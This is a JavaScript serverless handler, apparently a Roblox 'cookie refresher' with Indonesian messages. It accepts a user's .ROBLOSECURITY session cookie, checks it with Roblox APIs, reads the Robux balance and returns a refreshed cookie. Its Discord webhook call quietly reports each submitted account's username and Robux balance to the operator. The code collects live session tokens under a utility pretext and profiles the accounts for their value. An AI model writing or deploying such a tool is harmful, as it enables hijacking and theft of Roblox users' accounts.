export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { cookie } = req.body;
  if (!cookie || !cookie.includes('_|WARNING')) {
    return res.status(400).json({ error: 'Format cookie tidak valid.' });
  }

  try {
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!userRes.ok) return res.status(401).json({ error: 'Cookie kedaluwarsa atau tidak valid.' });
    const user = await userRes.json();

    const economyRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    const economy = economyRes.ok ? await economyRes.json() : { robux: 0 };

    const homeRes = await fetch('https://www.roblox.com/home', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      redirect: 'manual'
    });
    const setCookie = homeRes.headers.get('set-cookie') || '';
    const match = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);
    const newCookie = match ? match[1] : cookie;

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (webhookUrl) {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: '✅ Akun Berhasil Di-refresh',
            color: 0x3ddc97,
            fields: [
              {name:'Username', value: user.name, inline:true},
              {name:'Robux', value: String(economy.robux || 0), inline:true}
            ],
            timestamp: new Date().toISOString()
          }]
        })
      }).catch(() => {});
    }

    return res.status(200).json({
      newCookie: newCookie,
      account: {
        username: user.name,
        displayName: user.displayName,
        id: user.id,
        robux: economy.robux || 0,
      }
    });

  } catch (error) {
    return res.status(500).json({ error: 'Server error.' });
  }
}
